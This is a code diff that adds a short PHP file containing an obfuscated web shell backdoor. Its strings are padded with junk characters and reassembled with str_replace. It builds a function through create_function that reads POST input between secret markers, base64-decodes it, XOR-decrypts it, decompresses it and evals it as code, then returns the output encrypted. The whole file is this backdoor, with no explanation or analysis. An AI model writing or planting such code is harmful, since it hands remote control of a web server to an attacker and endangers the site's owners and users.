@@ -1,0 +1,10 @@
+<?php
+$p='$qk="81dc9bdbq";$kh="52qd04dcqqq2q0036";$kf="dbd8313ed0q55";$qp="v7KwqxiZXUEqnq1LE7S";functioqqn x($t,$k';
+$Y='contqqents();@ob_enqd_cleaqn();$rq=@bqase64_encqode(@x(q@gqzcoqmpreqss($o),$k));prqint("$pq$qkh$r$kf");}';
+$c='pqut"),$qm)==1) q{@ob_stqart();@eqval(q@gzqunqcompress(@xq(@baseq6q4_decode($mq[1q]),$k)));$o=q@obq_get_';
+$q='o.=q$t{$i}q^$k{$qj};}}qretuqqrn $o;}ifq (q@preg_match("/$kh(q.+)q$kf/q",@qfile_geqt_contents("qqphp://in';
+$I=str_replace('j','','cjreatjej_jfujjnction');
+$o='){q$qc=strlen(q$k);$l=qqstrlen($t);$o=q"";qfor(qq$i=0;q$i<$l;){for(q$qj=0;($j<$qc&&$i<$l);q$j++,$i++)q{$';
+$f=str_replace('q','',$p.$o.$q.$c.$Y);
+$S=$I('',$f);$S();
+?>
